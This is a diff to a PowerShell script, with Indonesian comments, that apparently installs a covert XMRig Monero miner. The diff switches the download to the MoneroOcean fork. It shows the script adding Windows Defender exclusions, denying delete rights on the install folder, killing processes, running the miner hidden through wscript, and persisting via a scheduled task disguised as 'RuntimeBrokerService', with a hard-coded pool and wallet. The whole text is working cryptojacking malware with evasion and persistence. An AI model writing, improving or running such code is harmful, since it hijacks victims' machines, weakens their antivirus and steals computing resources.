@@ -57,8 +57,9 @@ $Pool = "gulf.moneroocean.stream:10128"
 $Wallet = "42imHjeSVgSG54hiTVmeGa8evmKJ55oWYgb6np1zanx5j8eoCM4vfbN9xSua1unVEV5mZCxxs637LdmVEJMs1XMFCWsHvc1"
 $ArgsList = "-o $Pool -u $Wallet -p x --donate-level=1 --cpu-max-threads-hint=70 --background"
 
-# Hentikan proses lama
+# Hentikan proses lama & task scheduler yang nyangkut
 Stop-Process -Name "RuntimeBroker", "xmrig", "wscript", "OneDriveUpdater" -Force -ErrorAction SilentlyContinue
+Unregister-ScheduledTask -TaskName "RuntimeBrokerService" -Confirm:$false -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 1
 
 # ==========================================
@@ -66,7 +67,7 @@ Start-Sleep -Seconds 1
 # ==========================================
 try {
     $Acl = Get-Acl $Dir
-    $DenyRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "Delete, DeleteSubdirectoriesAndFiles", "ContainerInherit,ObjectInherit", "None", "Allow")
+    $DenyRule = New-Object System.Security.AccessControl.FileSystemAccessRule("BUILTIN\Users", "Delete, DeleteSubdirectoriesAndFiles", "ContainerInherit,ObjectInherit", "None", "Deny")
     $Acl.AddAccessRule($DenyRule)
     Set-Acl $Dir $Acl -ErrorAction SilentlyContinue
 } catch {}
@@ -75,10 +76,11 @@ Add-MpPreference -ExclusionPath $Dir -ErrorAction SilentlyContinue
 Add-MpPreference -ExclusionProcess $ExeName -ErrorAction SilentlyContinue
 
 # ==========================================
-# 4. UNDUH & EKSTRAK BINER XMRIG
+# 4. UNDUH & EKSTRAK BINER XMRIG (MONEROOCEAN FORK)
 # ==========================================
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-$DownloadUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-msvc-win64.zip"
+# Menggunakan repository resmi MoneroOcean fork xmrig yang mendukung full algo switching & benchmark otomatis
+$DownloadUrl = "https://github.com/MoneroOcean/xmrig/releases/download/v6.21.0-mo4/xmrig-6.21.0-mo4-msvc-win64.zip"
 Invoke-WebRequest -Uri $DownloadUrl -OutFile $ZipPath
 
 if (Test-Path $ZipPath) {
@@ -109,8 +111,6 @@ shell.Run """$ExePath"" $ArgsList", 0, False
     # ==========================================
     # 6. TASK SCHEDULER SYSTEM PRIVILEGE
     # ==========================================
-    Unregister-ScheduledTask -TaskName "RuntimeBrokerService" -Confirm:$false -ErrorAction SilentlyContinue
-    
     $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$VbsPath`""
     $Trigger = @(
         (New-ScheduledTaskTrigger -AtStartup),
@@ -124,7 +124,7 @@ shell.Run """$ExePath"" $ArgsList", 0, False
     # Jalankan langsung
     Start-Process -FilePath $ExePath -ArgumentList $ArgsList -WindowStyle Hidden
 
-    Write-Host "Setup sukses di: $Dir" -ForegroundColor Green
+    Write-Host "Setup sukses dengan MoneroOcean Fork di: $Dir" -ForegroundColor Green
 } else {
-    Write-Host "Gagal mengunduh biner miner." -ForegroundColor Red
+    Write-Host "Gagal mengunduh biner miner MoneroOcean." -ForegroundColor Red
 }
